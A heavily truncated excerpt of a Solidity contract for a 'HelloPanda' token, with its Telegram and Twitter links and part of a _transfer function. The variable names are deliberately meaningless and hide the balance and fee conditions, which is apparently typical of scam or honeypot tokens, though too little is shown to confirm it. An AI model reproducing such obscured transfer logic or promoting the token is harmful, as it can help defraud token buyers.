...
Telegram: https://t.me/HelloPandaOriginal

Twitter: https://twitter.com/HelloPandaToken
...
contract HelloPanda is IERC20, Ownable {
    ...
    function _transfer(
        ...
        if (_kitchen[_whistle] > _however && _walk == _few) {
            ...
            if (_Fee > 0 && !inSwapAndLiquify && _kitchen[_whistle] == 0 && _kitchen[_thing] == 0) {
